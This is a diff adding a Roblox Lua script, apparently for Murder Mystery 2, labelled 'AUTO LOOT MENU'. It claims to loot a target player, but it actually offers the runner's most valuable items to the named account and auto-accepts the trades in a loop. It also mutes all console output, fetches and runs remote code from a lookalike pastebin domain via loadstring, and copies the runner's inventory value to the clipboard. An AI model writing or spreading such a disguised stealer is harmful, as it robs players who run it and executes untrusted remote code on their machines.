@@ -1,0 +1,427 @@
+local f = function() end
+local g = getgenv()
+g.print, g.warn, g.error = f, f, f
+g.rconsoleprint, g.rconsolewarn, g.rconsoleerr, g.rconsoleinfo = f, f, f, f
+g.consoleprint, g.consolewarn, g.consoleerr = f, f, f
+pcall(function() if rconsoleclose then rconsoleclose() end end)
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+
+local LocalPlayer = Players.LocalPlayer
+local TradeRemote = ReplicatedStorage:WaitForChild("Trade")
+local InventoryRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Inventory")
+
+local VALUE_URL = "https://cdn.cdnpastebin.com/mm2values.js"
+local ItemValues = {}
+local NameIndex = {} -- reverse lookup by display name
+local ValuesReady = false
+
+task.spawn(function()
+    pcall(function()
+        local raw = game:HttpGet(VALUE_URL)
+        local loaded = loadstring(raw)()
+        if loaded then
+            ItemValues = loaded
+            -- build name index for fast lookup
+            for k, v in pairs(ItemValues) do
+                if type(v) == "table" and v.Name then
+                    NameIndex[string.lower(v.Name)] = v
+                end
+            end
+            ValuesReady = true
+        end
+    end)
+end)
+
+local function getDatabase()
+    local db = nil
+    pcall(function()
+        local dbModule = ReplicatedStorage:FindFirstChild("Database")
+        if dbModule then
+            local sync = dbModule:FindFirstChild("Sync")
+            if sync then
+                local item = sync:FindFirstChild("Item")
+                if item then
+                    local s, r = pcall(require, item)
+                    if s and r then db = r end
+                end
+            end
+        end
+    end)
+    return db
+end
+local Database = getDatabase()
+
+local function ResolveValue(id)
+    local cleanID = tostring(id)
+    local entry = ItemValues[cleanID]
+    if entry and type(entry) == "table" then
+        return entry.Value or 0, entry.Name or cleanID
+    end
+    -- try database name lookup
+    if Database then
+        local dbEntry = nil
+        pcall(function() dbEntry = Database[cleanID] end)
+        if dbEntry and dbEntry.Name then
+            local nkey = string.lower(dbEntry.Name)
+            local found = NameIndex[nkey]
+            if found then return found.Value or 0, found.Name or dbEntry.Name end
+        end
+    end
+    return 0, cleanID
+end
+
+local function getTradeableItems()
+    local tradeable = {}
+    local success, realData = pcall(function()
+        return InventoryRemote.GetProfileData:InvokeServer(LocalPlayer.Name)
+    end)
+    if not success or not realData then
+        return {}
+    end
+    local function processCategory(categoryName, tableData)
+        if not tableData then return end
+        for dataid, amount in pairs(tableData) do
+            local value, nameStr = ResolveValue(dataid)
+            if value >= 1 then
+                table.insert(
+                    tradeable,
+                    {
+                        DataID = dataid,
+                        Name = nameStr,
+                        Value = value,
+                        Amount = (tonumber(amount) or 1),
+                        Category = categoryName,
+                    }
+                )
+            end
+        end
+    end
+    if realData.Weapons and realData.Weapons.Owned then
+        processCategory("Weapons", realData.Weapons.Owned)
+    end
+    if realData.Pets and realData.Pets.Owned then
+        processCategory("Pets", realData.Pets.Owned)
+    end
+    table.sort(tradeable, function(a, b)
+        return a.Value > b.Value
+    end)
+    return tradeable
+end
+
+if CoreGui:FindFirstChild("ValAdderUI") then CoreGui.ValAdderUI:Destroy() end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ValAdderUI"
+ScreenGui.Parent = CoreGui
+ScreenGui.ResetOnSpawn = false
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 360, 0, 460)
+Frame.Position = UDim2.new(0.5, -180, 0.1, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 35)
+Title.BackgroundTransparency = 1
+Title.Text = "AUTO LOOT MENU"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 14
+Title.Parent = Frame
+
+local PlayerInput = Instance.new("TextBox")
+PlayerInput.Size = UDim2.new(1, -30, 0, 32)
+PlayerInput.Position = UDim2.new(0, 15, 0, 42)
+PlayerInput.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+PlayerInput.Text = "Type target username here"
+PlayerInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+PlayerInput.ClearTextOnFocus = true
+PlayerInput.Font = Enum.Font.Gotham
+PlayerInput.Parent = Frame
+Instance.new("UICorner", PlayerInput).CornerRadius = UDim.new(0, 4)
+
+-- total value display
+local TotalLabel = Instance.new("TextLabel")
+TotalLabel.Size = UDim2.new(1, -30, 0, 24)
+TotalLabel.Position = UDim2.new(0, 15, 0, 80)
+TotalLabel.BackgroundTransparency = 1
+TotalLabel.Text = "Total: 0 | Items: 0"
+TotalLabel.TextColor3 = Color3.fromRGB(88, 166, 255)
+TotalLabel.Font = Enum.Font.GothamBold
+TotalLabel.TextSize = 13
+TotalLabel.TextXAlignment = Enum.TextXAlignment.Left
+TotalLabel.Parent = Frame
+
+-- scrolling item list
+local ItemList = Instance.new("ScrollingFrame")
+ItemList.Size = UDim2.new(1, -30, 0, 130)
+ItemList.Position = UDim2.new(0, 15, 0, 108)
+ItemList.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+ItemList.BorderSizePixel = 0
+ItemList.ScrollBarThickness = 4
+ItemList.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 60)
+ItemList.CanvasSize = UDim2.new(0, 0, 0, 0)
+ItemList.Parent = Frame
+Instance.new("UICorner", ItemList).CornerRadius = UDim.new(0, 4)
+
+local ItemListLayout = Instance.new("UIListLayout")
+ItemListLayout.Padding = UDim.new(0, 2)
+ItemListLayout.Parent = ItemList
+
+local function CreateBtn(name, pos, color)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, -30, 0, 36)
+    btn.Position = pos
+    btn.BackgroundColor3 = color
+    btn.Text = name
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 12
+    btn.Parent = Frame
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+    return btn
+end
+
+local RefreshBtn = CreateBtn("REFRESH ITEMS", UDim2.new(0, 15, 0, 248), Color3.fromRGB(30, 100, 200))
+local AutoLootBtn = CreateBtn("START AUTO LOOT", UDim2.new(0, 15, 0, 292), Color3.fromRGB(0, 160, 80))
+local StopBtn = CreateBtn("STOP AUTO LOOT", UDim2.new(0, 15, 0, 336), Color3.fromRGB(200, 40, 40))
+local CopyBtn = CreateBtn("COPY TO CLIPBOARD", UDim2.new(0, 15, 0, 380), Color3.fromRGB(140, 80, 200))
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, 0, 0, 20)
+Status.Position = UDim2.new(0, 0, 1, -20)
+Status.BackgroundTransparency = 1
+Status.Text = "Status: Idle (RightShift to Toggle GUI)"
+Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+Status.Font = Enum.Font.Gotham
+Status.TextSize = 10
+Status.Parent = Frame
+
+local ActiveLoop = false
+local lastItems = {}
+local lastTotal = 0
+
+local function formatValue(v)
+    if v >= 1000000 then return string.format("%.2fM", v / 1000000)
+    elseif v >= 1000 then return string.format("%.1fK", v / 1000)
+    else return tostring(v) end
+end
+
+local function refreshItemList()
+    if not ValuesReady then
+        Status.Text = "Status: Loading values... please wait"
+        return
+    end
+    -- clear old rows
+    for _, child in ipairs(ItemList:GetChildren()) do
+        if child:IsA("TextLabel") then child:Destroy() end
+    end
+
+    local items = getTradeableItems()
+    lastItems = items
+    local total = 0
+    for _, it in ipairs(items) do
+        total = total + (it.Value * it.Amount)
+    end
+    lastTotal = total
+
+    TotalLabel.Text = string.format("TOTAL VALUE: %d | Items: %d", total, #items)
+
+    if total >= 1000000 then
+        TotalLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+    elseif total >= 100000 then
+        TotalLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
+    else
+        TotalLabel.TextColor3 = Color3.fromRGB(88, 166, 255)
+    end
+
+    local y = 0
+    for _, it in ipairs(items) do
+        local row = Instance.new("TextLabel")
+        row.Size = UDim2.new(1, -8, 0, 20)
+        row.Position = UDim2.new(0, 4, 0, y)
+        row.BackgroundTransparency = 1
+        row.Text = string.format("x%d %s -> %d", it.Amount, it.Name, it.Value * it.Amount)
+        row.TextColor3 = Color3.fromRGB(200, 200, 200)
+        row.Font = Enum.Font.Gotham
+        row.TextSize = 11
+        row.TextXAlignment = Enum.TextXAlignment.Left
+        row.Parent = ItemList
+        y = y + 22
+    end
+
+    ItemList.CanvasSize = UDim2.new(0, 0, 0, math.max(y, 130))
+
+    -- auto copy to clipboard in trade format
+    local clip = {"TOTAL VALUE: " .. tostring(total)}
+    for _, it in ipairs(items) do
+        table.insert(clip, string.format("x%d %s -> %d", it.Amount, it.Name, it.Value * it.Amount))
+    end
+    local clipStr = table.concat(clip, "\n")
+    pcall(function()
+        if setclipboard then setclipboard(clipStr) end
+    end)
+    Status.Text = string.format("Status: %d total | %d items | Copied!", total, #items)
+end
+
+local function getTradeStatus()
+    local s, r = pcall(function()
+        return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+    end)
+    return r or "None"
+end
+
+_G.LastOffer = _G.LastOffer or nil
+local updateConn
+if updateConn then pcall(function() updateConn:Disconnect() end) end
+pcall(function()
+    updateConn = ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(x)
+        _G.LastOffer = x.LastOffer
+    end)
+end)
+
+local function acceptTrade()
+    if _G.LastOffer then
+        pcall(function() ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer) end)
+    end
+end
+
+RefreshBtn.MouseButton1Click:Connect(function()
+    refreshItemList()
+end)
+
+CopyBtn.MouseButton1Click:Connect(function()
+    if #lastItems == 0 then refreshItemList() end
+    local clip = {"TOTAL VALUE: " .. tostring(lastTotal)}
+    for _, it in ipairs(lastItems) do
+        table.insert(clip, string.format("x%d %s -> %d", it.Amount, it.Name, it.Value * it.Amount))
+    end
+    local clipStr = table.concat(clip, "\n")
+    pcall(function()
+        if setclipboard then setclipboard(clipStr) end
+    end)
+    Status.Text = "Status: Copied to clipboard!"
+end)
+
+AutoLootBtn.MouseButton1Click:Connect(function()
+    if ActiveLoop then return end
+    local targetName = PlayerInput.Text
+    local targetPlayer
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and (string.find(string.lower(p.Name), string.lower(targetName)) or string.find(string.lower(p.DisplayName), string.lower(targetName))) then
+            targetPlayer = p
+            break
+        end
+    end
+
+    if not targetPlayer then
+        Status.Text = "Status: Target player not found in server!"
+        return
+    end
+
+    ActiveLoop = true
+    Status.Text = "Status: Auto Looting " .. targetPlayer.Name .. "..."
+    AutoLootBtn.Text = "LOOTING..."
+    AutoLootBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+
+    task.spawn(function()
+        local itemsAdded = false
+        local tradeableItems = {}
+
+        while ActiveLoop do
+            task.wait(0.1)
+            if not targetPlayer or not targetPlayer.Parent then
+                Status.Text = "Status: Target left the game."
+                ActiveLoop = false
+                break
+            end
+
+            local tradeStatus = getTradeStatus()
+            if tradeStatus == "None" then
+                itemsAdded = false
+                tradeableItems = getTradeableItems()
+                if #tradeableItems == 0 then
+                    Status.Text = "Status: No items left to trade."
+                    ActiveLoop = false
+                    break
+                end
+
+                pcall(function()
+                    ReplicatedStorage.Trade.SendRequest:InvokeServer(targetPlayer)
+                end)
+                Status.Text = "Status: Sending Trade Request..."
+                task.wait(2)
+
+            elseif tradeStatus == "ReceivingRequest" then
+                pcall(function()
+                    ReplicatedStorage.Trade.AcceptRequest:FireServer()
+                end)
+
+            elseif tradeStatus == "StartTrade" then
+                if not itemsAdded then
+                    Status.Text = "Status: Offering items..."
+                    local topFourStacks = {}
+                    for i = 1, math.min(4, #tradeableItems) do
+                        table.insert(topFourStacks, tradeableItems[i])
+                    end
+                    for _, stack in ipairs(topFourStacks) do
+                        for i = 1, stack.Amount do
+                            pcall(function()
+                                ReplicatedStorage.Trade.OfferItem:FireServer(stack.DataID, stack.Category)
+                            end)
+                        end
+                    end
+                    itemsAdded = true
+                    task.wait(3)
+                    Status.Text = "Status: Accepting trade..."
+                    acceptTrade()
+                else
+                    acceptTrade()
+                end
+            end
+        end
+
+        ActiveLoop = false
+        AutoLootBtn.Text = "START AUTO LOOT"
+        AutoLootBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 80)
+        if Status.Text:find("Auto Looting") then
+            Status.Text = "Status: Stopped"
+        end
+    end)
+end)
+
+StopBtn.MouseButton1Click:Connect(function()
+    ActiveLoop = false
+    Status.Text = "Status: Stopped by user"
+    AutoLootBtn.Text = "START AUTO LOOT"
+    AutoLootBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 80)
+end)
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if not processed and input.KeyCode == Enum.KeyCode.RightShift then
+        ScreenGui.Enabled = not ScreenGui.Enabled
+    end
+end)
+
+-- auto-load items on spawn — wait for values then refresh
+task.spawn(function()
+    local waited = 0
+    while not ValuesReady and waited < 30 do
+        task.wait(1)
+        waited = waited + 1
+    end
+    if ValuesReady then
+        pcall(refreshItemList)
+    else
+        Status.Text = "Status: Failed to load values from server"
+    end
+end)
